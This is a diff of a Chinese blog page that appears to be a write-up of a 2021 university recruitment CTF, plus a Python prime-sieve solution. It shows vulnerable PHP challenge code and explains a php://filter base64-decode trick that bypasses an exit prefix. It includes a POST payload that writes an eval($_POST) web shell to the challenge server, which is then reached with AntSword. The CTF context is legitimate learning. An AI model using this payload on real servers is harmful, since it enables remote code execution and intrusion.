-<p>发现存在file_put_contents函数。 由于base64编码中只包含64个可打印字符，在解码的时候，遇到这64个之外的字符，就会略过并且base64解码是四个byte一组，所以再增加一个字符，凑够两组，后面的就会正常解码 所以可以利用php://filter流的base64_decode函数特性去除exit。 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">payload: </span><br><span class="line">url: http:<span class="comment">//1.15.145.49:83/index.php?src=1</span></span><br><span class="line">POST: prefix=php:<span class="comment">//filter/write=convert.base64-decode/resource=&amp;name=shell.php&amp;txt=aPD9waHAgZXZhbChAJF9QT1NUWydhJ10pOyA/Pg==</span></span><br><span class="line">之后使用蚁剑连接http:<span class="comment">//1.15.145.49:83/uploads/16bebaa6795a6d29635ae505fab74742/shell.php</span></span><br><span class="line">即可。</span><br></pre></td></tr></table></figure></p>
+<pre class="language-php" data-language="php"><code class="language-php">?src=1string(41) "uploads/16bebaa6795a6d29635ae505fab74742/"
+
+抱着试一试的心态:
+payload: ?src=1
+源码显露出来了。
+
+error_reporting(0);
+echo "?src=1";
+$dir='uploads/';
+if (!is_dir($dir)) &#123;
+    mkdir($dir,0755);
+&#125;
+$dir = "uploads/".md5($_SERVER['REMOTE_ADDR']).'/';
+var_dump($dir);
+if (!is_dir($dir)) &#123;
+    mkdir($dir,0755);
+&#125;
+
+$content = '<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">exit</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span>';
+$content .= $_POST['txt'];
+$prefix=$_POST['prefix'];
+$name=$_POST['name'];
+if(strpos('./',$prefix) or strpos('./',$name))&#123;
+    die("?");
+&#125;
+$filename=$prefix.$dir.$name;
+file_put_contents($filename, $content);
+
+if (isset($_GET['src']))
+&#123;
+highlight_file(__FILE__);
+&#125;
+<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">eval</span><span class="token punctuation">(</span>@<span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span>
+//flag is in /flag
+?></code></pre>
+<p>发现存在file_put_contents函数。 由于base64编码中只包含64个可打印字符，在解码的时候，遇到这64个之外的字符，就会略过并且base64解码是四个byte一组，所以再增加一个字符，凑够两组，后面的就会正常解码 所以可以利用php://filter流的base64_decode函数特性去除exit。 <pre class="language-php" data-language="php"><code class="language-php">
+payload<span class="token punctuation">:</span> 
+url<span class="token punctuation">:</span> http<span class="token punctuation">:</span><span class="token comment">//1.15.145.49:83/index.php?src=1</span>
+<span class="token constant">POST</span><span class="token punctuation">:</span> prefix<span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment">//filter/write=convert.base64-decode/resource=&amp;name=shell.php&amp;txt=aPD9waHAgZXZhbChAJF9QT1NUWydhJ10pOyA/Pg==</span>
+之后使用蚁剑连接http<span class="token punctuation">:</span><span class="token comment">//1.15.145.49:83/uploads/16bebaa6795a6d29635ae505fab74742/shell.php</span>
+即可。</code></pre></p>
 <h2 id="全新oj上线辣">全新OJ上线辣</h2>
-<p>没做出来，把这题A了，orz A的代码，用的筛法+二分，没有python模板，网上找的。 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sieve_of_eratosthenes</span>(<span class="params">n</span>):</span></span><br><span class="line">    primes = [<span class="literal">True</span>] * (n+<span class="number">1</span>)</span><br><span class="line">    p = <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> p * p &lt;= n:</span><br><span class="line">        <span class="keyword">if</span> primes[p]:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(p * <span class="number">2</span>, n + <span class="number">1</span>, p):</span><br><span class="line">                primes[i] = <span class="literal">False</span></span><br><span class="line">        p += <span class="number">1</span></span><br><span class="line">    primes = [element <span class="keyword">for</span> element <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, n) <span class="keyword">if</span> primes[element]]</span><br><span class="line">    <span class="keyword">return</span> primes;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">search</span>(<span class="params">nums: <span class="built_in">list</span>[<span class="built_in">int</span>], target: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span></span><br><span class="line">    left, right = <span class="number">0</span>, <span class="built_in">len</span>(nums) - <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> left &lt;= right:</span><br><span class="line">        pivot = left + (right - left) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> nums[pivot] == target:</span><br><span class="line">            <span class="keyword">return</span> pivot</span><br><span class="line">        <span class="keyword">if</span> target &lt; nums[pivot]:</span><br><span class="line">            right = pivot - <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            left = pivot + <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    x=<span class="built_in">input</span>()</span><br><span class="line">    x=<span class="built_in">int</span>(x)</span><br><span class="line">    primes=sieve_of_eratosthenes(x+<span class="number">1</span>)</span><br><span class="line">    n=<span class="built_in">len</span>(primes)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        <span class="keyword">if</span>(x%primes[i]==<span class="number">0</span>):</span><br><span class="line">            flag = search(primes,x/primes[i])</span><br><span class="line">            <span class="keyword">if</span>(flag!=-<span class="number">1</span>):</span><br><span class="line">                <span class="built_in">print</span>(<span class="number">1</span>)</span><br><span class="line">                exit(<span class="number">0</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="number">0</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure> CTF：TODO</p>
-
-    </div>
-
-    
-    
-    
-
-      <footer class="post-footer">
-
-        
-
-          <div class="post-nav">
-            <div class="post-nav-next post-nav-item">
-                <a href="/2021/08/17/BUUCTF-WEB-RoarCTF-2019-Easy-Calc/" rel="next" title="BUUCTF WEB [RoarCTF 2019]Easy Calc">
-                  <i class="fa fa-chevron-left"></i> BUUCTF WEB [RoarCTF 2019]Easy Calc
-                </a>
-            </div>
-
-            <span class="post-nav-divider"></span>
-
-            <div class="post-nav-prev post-nav-item">
-            </div>
-          </div>
-      </footer>
-    
-  </article>
-  
-  
-  
-
-  </div>
-
-
-          </div>
-          
-
-        </div>
-          
-  
-  <div class="toggle sidebar-toggle">
-    <span class="toggle-line toggle-line-first"></span>
-    <span class="toggle-line toggle-line-middle"></span>
-    <span class="toggle-line toggle-line-last"></span>
-  </div>
-
-  <aside class="sidebar">
-    <div class="sidebar-inner">
-
-      <ul class="sidebar-nav motion-element">
-        <li class="sidebar-nav-toc">
-          文章目录
-        </li>
-        <li class="sidebar-nav-overview">
-          站点概览
-        </li>
-      </ul>
-
-      <!--noindex-->
-      <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#result"><span class="nav-text">Result</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#easy_eval"><span class="nav-text">easy_eval</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#check_in_sql"><span class="nav-text">check_in_sql</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#easy_ping"><span class="nav-text">easy_ping</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#easy_include"><span class="nav-text">easy_include</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#upload"><span class="nav-text">upload</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#easy_shell"><span class="nav-text">easy_shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%A8%E6%96%B0oj%E4%B8%8A%E7%BA%BF%E8%BE%A3"><span class="nav-text">全新OJ上线辣</span></a></li></ol></div>
-      </div>
-      <!--/noindex-->
-
-      <div class="site-overview-wrap sidebar-panel">
-        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <img class="site-author-image" itemprop="image" alt="attpower"
-      src="/images/avatar.gif">
-  <p class="site-author-name" itemprop="name">attpower</p>
-  <div class="site-description" itemprop="description"></div>
-</div>
-<div class="site-state-wrap motion-element">
-  <nav class="site-state">
-      <div class="site-state-item site-state-posts">
-          <a href="/archives/">
-        
-          <span class="site-state-item-count">21</span>
-          <span class="site-state-item-name">日志</span>
-        </a>
-      </div>
-      <div class="site-state-item site-state-categories">
-            <a href="/categories/">
-          
-        <span class="site-state-item-count">5</span>
-        <span class="site-state-item-name">分类</span></a>
-      </div>
-      <div class="site-state-item site-state-tags">
-            <a href="/tags/">
-          
-        <span class="site-state-item-count">10</span>
-        <span class="site-state-item-name">标签</span></a>
-      </div>
-  </nav>
-</div>
-  <div class="links-of-author motion-element">
-      <span class="links-of-author-item">
-        <a href="https://github.com/yglsaltfish" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;yglsaltfish" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
-      </span>
-  </div>
-
-
-
-      </div>
-        <div class="back-to-top motion-element">
-          <i class="fa fa-arrow-up"></i>
-          <span>0%</span>
-        </div>
-
-    </div>
-  </aside>
-  <div id="sidebar-dimmer"></div>
-
-
-      </div>
-    </main>
-
-    <footer class="footer">
-      <div class="footer-inner">
-        
-
-<div class="copyright">
-  
-  &copy; 
-  <span itemprop="copyrightYear">2021</span>
-  <span class="with-love">
-    <i class="fa fa-user"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">attpower</span>
-</div>
-  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v5.4.0
-  </div>
-  <span class="post-meta-divider">|</span>
-  <div class="theme-info">主题 – <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a> v7.5.0
-  </div>
-
-        
-<div class="busuanzi-count">
-  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
-      <span class="post-meta-item-icon">
-        <i class="fa fa-user"></i>
-      </span>
-      <span class="site-uv" title="总访客量">
-        <span id="busuanzi_value_site_uv"></span>
-      </span>
-    </span>
-    <span class="post-meta-divider">|</span>
-    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
-      <span class="post-meta-item-icon">
-        <i class="fa fa-eye"></i>
-      </span>
-      <span class="site-pv" title="总访问量">
-        <span id="busuanzi_value_site_pv"></span>
-      </span>
-    </span>
-</div>
-
-
-
-
-
-
-
-
-
-
-
-
-        
-      </div>
-    </footer>
-  </div>
-
-  
-  <script size="300" alpha="0.6" zIndex="-1" src="/lib/canvas-ribbon/canvas-ribbon.js"></script>
-  <script src="/lib/anime.min.js"></script>
-  <script src="/lib/velocity/velocity.min.js"></script>
-  <script src="/lib/velocity/velocity.ui.min.js"></script>
-
-<script src="/js/utils.js"></script>
-
-<script src="/js/motion.js"></script>
-
-
-<script src="/js/schemes/muse.js"></script>
-
-
-<script src="/js/next-boot.js"></script>
-
-
-
-
-  
-  <script>
-    (function(){
-      var bp = document.createElement('script');
-      var curProtocol = window.location.protocol.split(':')[0];
-      bp.src = (curProtocol === 'https') ? 'https://zz.bdstatic.com/linksubmit/push.js' : 'http://push.zhanzhang.baidu.com/push.js';
-      var s = document.getElementsByTagName("script")[0];
-      s.parentNode.insertBefore(bp, s);
-    })();
-  </script>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-  
-
-  
-      
-<script type="text/x-mathjax-config">
-
-  MathJax.Hub.Config({
-    tex2jax: {
-      inlineMath: [ ['$', '$'], ['\\(', '\\)'] ],
-      processEscapes: true,
-      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
-    },
-    TeX: {
-      equationNumbers: {
-        autoNumber: 'AMS'
-      }
-    }
-  });
-
-  MathJax.Hub.Register.StartupHook('TeX Jax Ready', function() {
-    MathJax.InputJax.TeX.prefilterHooks.Add(function(data) {
-      if (data.display) {
-        var next = data.script.nextSibling;
-        while (next && next.nodeName.toLowerCase() === '#text') {
-          next = next.nextSibling;
-        }
-        if (next && next.nodeName.toLowerCase() === 'br') {
-          next.parentNode.removeChild(next);
-        }
-      }
-    });
-  });
-
-  MathJax.Hub.Queue(function() {
-    var all = MathJax.Hub.getAllJax(), i;
-    for (i = 0; i < all.length; i += 1) {
-      element = document.getElementById(all[i].inputID + '-Frame').parentNode;
-      if (element.nodeName.toLowerCase() == 'li') {
-        element = element.parentNode;
-      }
-      element.classList.add('has-jax');
-    }
-  });
-</script>
-<script>
-  NexT.utils.getScript('//cdn.jsdelivr.net/npm/mathjax@2/MathJax.js?config=TeX-AMS-MML_HTMLorMML', () => {
-    MathJax.Hub.Typeset();
-  }, window.MathJax);
-</script>
-
-    
-
-  
-
-</body>
-</html>
+<p>没做出来，把这题A了，orz A的代码，用的筛法+二分，没有python模板，网上找的。 <pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">sieve_of_eratosthenes</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    primes <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token boolean">True</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token punctuation">(</span>n<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span>
+    p <span class="token operator">=</span> <span class="token number">2</span>
+    <span class="token keyword">while</span> p <span class="token operator">*</span> p <span class="token operator">&lt;=</span> n<span class="token punctuation">:</span>
+        <span class="token keyword">if</span> primes<span class="token punctuation">[</span>p<span class="token punctuation">]</span><span class="token punctuation">:</span>
+            <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>p <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">,</span> n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token punctuation">:</span>
+                primes<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">False</span>
+        p <span class="token operator">+=</span> <span class="token number">1</span>
+    primes <span class="token operator">=</span> <span class="token punctuation">[</span>element <span class="token keyword">for</span> element <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span> <span class="token keyword">if</span> primes<span class="token punctuation">[</span>element<span class="token punctuation">]</span><span class="token punctuation">]</span>
+    <span class="token keyword">return</span> primes<span class="token punctuation">;</span>
+
+<span class="token keyword">def</span> <span class="token function">search</span><span class="token punctuation">(</span>nums<span class="token punctuation">:</span> <span class="token builtin">list</span><span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">]</span><span class="token punctuation">,</span> target<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">int</span><span class="token punctuation">:</span>
+    left<span class="token punctuation">,</span> right <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span>
+    <span class="token keyword">while</span> left <span class="token operator">&lt;=</span> right<span class="token punctuation">:</span>
+        pivot <span class="token operator">=</span> left <span class="token operator">+</span> <span class="token punctuation">(</span>right <span class="token operator">-</span> left<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>
+        <span class="token keyword">if</span> nums<span class="token punctuation">[</span>pivot<span class="token punctuation">]</span> <span class="token operator">==</span> target<span class="token punctuation">:</span>
+            <span class="token keyword">return</span> pivot
+        <span class="token keyword">if</span> target <span class="token operator">&lt;</span> nums<span class="token punctuation">[</span>pivot<span class="token punctuation">]</span><span class="token punctuation">:</span>
+            right <span class="token operator">=</span> pivot <span class="token operator">-</span> <span class="token number">1</span>
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            left <span class="token operator">=</span> pivot <span class="token operator">+</span> <span class="token number">1</span>
+    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span>
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
+    x<span class="token operator">=</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    x<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>
+    primes<span class="token operator">=</span>sieve_of_eratosthenes<span class="token punctuation">(</span>x<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span>
+    n<span class="token operator">=</span><span class="token builtin">len</span><span class="token punctuation">(</span>primes<span class="token punctuation">)</span>
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span>x<span class="token operator">%</span>primes<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            flag <span class="token operator">=</span> search<span class="token punctuation">(</span>primes<span class="token punctuation">,</span>x<span class="token operator">/</span>primes<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>
+            <span class="token keyword">if</span><span class="token punctuation">(</span>flag<span class="token operator">!=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+                exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+</code></pre> CTF：TODO</p>
+</div><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>attpower</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="https://yglsaltfish.github.io/2021/08/29/neuq-2021-%E6%8B%9B%E6%96%B0%E8%B5%9Bweb/" title="neuq 2021 招新赛web">https://yglsaltfish.github.io/2021/08/29/neuq-2021-%E6%8B%9B%E6%96%B0%E8%B5%9Bweb/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><svg class="icon"><use xlink:href="#icon-creative-commons-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-by-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-nc-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-sa-line"></use></svg></a> 许可协议。</li></ul></section></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/2021/09/17/%E6%AF%94%E7%89%B9%E5%B8%81%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" rel="prev" title="BTC相关知识"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-left-s-line"></use></svg><span class="post-nav-text">BTC相关知识</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/2021/08/17/BUUCTF-WEB-RoarCTF-2019-Easy-Calc/" rel="next" title="BUUCTF WEB [RoarCTF 2019]Easy Calc"><span class="post-nav-text">BUUCTF WEB [RoarCTF 2019]Easy Calc</span><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-right-s-line"></use></svg></a></div></div></div><div class="hty-card" id="comment"><div class="comment-tooltip text-center"><span>要不要和我说些什么？</span><br></div></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2019 – 2021 </span><span class="with-love" id="animate"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-cloud-line"></use></svg></span><span class="author"> attpower</span></div><div class="powered"><span>由 <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 驱动 v5.4.0</span><span class="footer-separator">|</span><span>主题 - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.6.2</span></div></footer><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-up-s-line"></use></svg><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a></div><script src="https://cdn.jsdelivr.net/npm/live2d-widget@^3.1.3/lib/L2Dwidget.min.js"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"https://cdn.jsdelivr.net/npm/live2d-widget-model-wanko@1.0.5/assets/wanko.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script></body></html>
